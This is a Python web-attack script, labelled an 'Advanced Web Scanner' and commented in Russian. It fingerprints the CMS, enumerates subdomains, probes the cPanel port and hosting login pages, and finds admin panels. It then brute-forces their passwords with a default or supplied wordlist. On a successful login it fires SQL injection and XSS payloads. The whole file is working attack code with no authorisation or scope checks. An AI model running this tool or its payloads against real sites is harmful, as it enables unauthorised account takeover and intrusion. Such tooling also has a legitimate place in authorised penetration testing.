import aiohttp
import asyncio
from colorama import Fore, Style
import argparse
import logging
from datetime import datetime
import sys
import re
import socket
from urllib.parse import urlparse

# Настройка логирования
logging.basicConfig(
    filename="scan_results.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
)

# Конфигурация через аргументы командной строки
parser = argparse.ArgumentParser(description="Advanced Web Scanner")
parser.add_argument("--url", help="Target URL (e.g., https://example.com)", required=True)
parser.add_argument("--timeout", type=int, default=5, help="Request timeout in seconds")
parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests")
parser.add_argument("--wordlist", type=str, help="Path to password wordlist file")
parser.add_argument("--subdomains", type=str, help="Path to subdomains wordlist file")
args = parser.parse_args()

# Загрузка паролей из файла или использование стандартного списка
if args.wordlist:
    try:
        with open(args.wordlist, 'r') as f:
            PASSWORD_LIST = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Wordlist file not found, using default passwords{Style.RESET_ALL}")
        PASSWORD_LIST = ["admin", "password", "123456", "admin123", "qwerty123"]
else:
    PASSWORD_LIST = ["admin", "password", "123456", "admin123", "qwerty123"]

# Загрузка списка поддоменов
SUBDOMAIN_LIST = []
if args.subdomains:
    try:
        with open(args.subdomains, 'r') as f:
            SUBDOMAIN_LIST = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Subdomains file not found, skipping subdomain scan{Style.RESET_ALL}")

# Улучшенные пути к админ-панелям
ADMIN_PATHS = [
    "admin", "admin/login", "wp-admin", "administrator", 
    "backend", "controlpanel", "manager", "login/admin"
]

# Улучшенные payloads для SQLi/XSS
SQLI_PAYLOADS = [
    "' OR 1=1 --", 
    "admin'--", 
    "\" OR \"\"=\"",
    "' OR 'a'='a"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

# CMS detection fingerprints
CMS_FINGERPRINTS = {
    "WordPress": ["wp-content", "wp-includes", "wordpress"],
    "Joomla": ["joomla", "media/jui", "templates/system"],
    "Drupal": ["sites/all", "core/misc/drupal.js", "Drupal.settings"],
    "Magento": ["skin/frontend", "js/mage", "Magento_"],
    "OpenCart": ["catalog/view/theme", "system/storage", "index.php?route="]
}

# Ограничение параллельных запросов
SEMAPHORE = asyncio.Semaphore(10)

async def detect_cms(session, url):
    try:
        async with SEMAPHORE:
            async with session.get(url, timeout=args.timeout) as response:
                text = await response.text()
                headers = response.headers
                
                # Check by content
                for cms, fingerprints in CMS_FINGERPRINTS.items():
                    if any(fingerprint in text for fingerprint in fingerprints):
                        logging.info(f"Detected CMS: {cms} at {url}")
                        print(f"{Fore.CYAN}[+] Detected CMS: {cms}{Style.RESET_ALL}")
                        return cms
                
                # Check by headers
                if "x-powered-by" in headers:
                    if "wordpress" in headers["x-powered-by"].lower():
                        logging.info(f"Detected CMS: WordPress at {url} (by header)")
                        print(f"{Fore.CYAN}[+] Detected CMS: WordPress (by header){Style.RESET_ALL}")
                        return "WordPress"
                
                # Check common files
                common_files = {
                    "WordPress": "wp-login.php",
                    "Joomla": "administrator/index.php",
                    "Drupal": "user/login"
                }
                
                for cms, path in common_files.items():
                    check_url = f"{url.rstrip('/')}/{path}"
                    try:
                        async with session.get(check_url, timeout=args.timeout) as resp:
                            if resp.status == 200:
                                logging.info(f"Detected CMS: {cms} at {url} (by common file)")
                                print(f"{Fore.CYAN}[+] Detected CMS: {cms} (by common file){Style.RESET_ALL}")
                                return cms
                    except:
                        continue
                
                logging.info(f"No CMS detected at {url}")
                print(f"{Fore.YELLOW}[-] No CMS detected{Style.RESET_ALL}")
                return None
    except Exception as e:
        logging.error(f"CMS detection error at {url}: {str(e)}")
        return None

async def check_subdomains(session, base_domain):
    if not SUBDOMAIN_LIST:
        return []
    
    discovered = []
    tasks = []
    
    for subdomain in SUBDOMAIN_LIST:
        url = f"http://{subdomain}.{base_domain}"
        tasks.append(check_subdomain(session, url))
    
    results = await asyncio.gather(*tasks)
    discovered = [result for result in results if result]
    
    if discovered:
        print(f"{Fore.GREEN}[+] Discovered subdomains:{Style.RESET_ALL}")
        for sub in discovered:
            print(f"  - {sub}")
    
    return discovered

async def check_subdomain(session, url):
    try:
        async with SEMAPHORE:
            async with session.get(url, timeout=args.timeout) as response:
                if response.status < 400:
                    logging.info(f"Discovered subdomain: {url}")
                    return url
    except:
        pass
    return None

async def scan_cpanel_port(domain):
    try:
        parsed = urlparse(domain)
        domain = parsed.netloc or parsed.path.split('/')[0]
        
        port = 2083  # cPanel SSL port
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(args.timeout)
        
        result = sock.connect_ex((domain, port))
        sock.close()
        
        if result == 0:
            logging.info(f"cPanel port (2083) open at {domain}")
            print(f"{Fore.GREEN}[+] cPanel port (2083) open at {domain}{Style.RESET_ALL}")
            return True
    except Exception as e:
        logging.error(f"cPanel port scan error: {str(e)}")
    
    return False

async def find_hosting_login(session, url):
    common_hosting_logins = [
        "cpanel", "whm", "webmail", "plesk", "directadmin",
        "hosting", "account", "clientarea"
    ]
    
    found = False
    for path in common_hosting_logins:
        test_url = f"{url.rstrip('/')}/{path}"
        try:
            async with SEMAPHORE:
                async with session.get(test_url, timeout=args.timeout) as response:
                    if response.status == 200:
                        text = await response.text()
                        if "login" in text.lower() or "sign in" in text.lower():
                            logging.info(f"Found hosting login at: {test_url}")
                            print(f"{Fore.GREEN}[+] Found hosting login at: {test_url}{Style.RESET_ALL}")
                            found = True
        except Exception as e:
            logging.error(f"Hosting login check error: {str(e)}")
    
    if not found:
        logging.info(f"No hosting login found at {url}")
        print(f"{Fore.YELLOW}[-] No hosting login found{Style.RESET_ALL}")
    
    return found

async def check_admin_panel(session, url, path):
    full_url = f"{url.rstrip('/')}/{path}"
    try:
        async with SEMAPHORE:
            async with session.get(full_url, timeout=args.timeout) as response:
                text = await response.text()
                if response.status == 200 and ("login" in text.lower() or "admin" in text.lower() or "password" in text.lower()):
                    logging.info(f"Found admin panel: {full_url}")
                    print(f"{Fore.GREEN}[+] Found admin panel: {full_url}{Style.RESET_ALL}")
                    return full_url
    except Exception as e:
        logging.error(f"Error checking {full_url}: {str(e)}")
    return None

async def brute_force_login(session, admin_url):
    for password in PASSWORD_LIST:
        try:
            data = {"username": "admin", "password": password}
            async with session.post(admin_url, data=data, timeout=args.timeout) as response:
                text = await response.text()
                if "dashboard" in text.lower() or "welcome" in text.lower() or "logout" in text.lower():
                    logging.info(f"Successful login: {admin_url} | Password: {password}")
                    print(f"{Fore.GREEN}[+] Login success: {password}{Style.RESET_ALL}")
                    return password
            await asyncio.sleep(args.delay)
        except Exception as e:
            logging.error(f"Brute force error: {str(e)}")
    return None

async def check_sqli(session, url):
    for payload in SQLI_PAYLOADS:
        try:
            test_url = f"{url}?id={payload}"
            async with session.get(test_url, timeout=args.timeout) as response:
                text = await response.text()
                if "error" in text.lower() or "sql" in text.lower() or "syntax" in text.lower():
                    logging.warning(f"Possible SQLi found: {test_url}")
                    print(f"{Fore.RED}[!] Possible SQLi vulnerability: {test_url}{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"SQLi check error: {str(e)}")

async def check_xss(session, url):
    for payload in XSS_PAYLOADS:
        try:
            test_url = f"{url}?search={payload}"
            async with session.get(test_url, timeout=args.timeout) as response:
                text = await response.text()
                if payload in text:
                    logging.warning(f"Possible XSS found: {test_url}")
                    print(f"{Fore.RED}[!] Possible XSS vulnerability: {test_url}{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"XSS check error: {str(e)}")

async def main():
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[!] URL must start with http:// or https://{Style.RESET_ALL}")
        sys.exit(1)

    parsed_url = urlparse(args.url)
    base_domain = parsed_url.netloc
    
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # CMS Detection
        await detect_cms(session, args.url)
        
        # Subdomain scanning
        if SUBDOMAIN_LIST:
            await check_subdomains(session, base_domain)
        
        # cPanel port scan
        await scan_cpanel_port(base_domain)
        
        # Hosting login search
        await find_hosting_login(session, args.url)
        
        # Admin panel scanning
        admin_panels = await asyncio.gather(*[check_admin_panel(session, args.url, path) for path in ADMIN_PATHS])
        admin_panels = [panel for panel in admin_panels if panel]
        
        for panel in admin_panels:
            password = await brute_force_login(session, panel)
            if password:
                await check_sqli(session, panel)
                await check_xss(session, panel)

if __name__ == "__main__":
    print(f"{Fore.CYAN}Scan started at {datetime.now()}{Style.RESET_ALL}")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)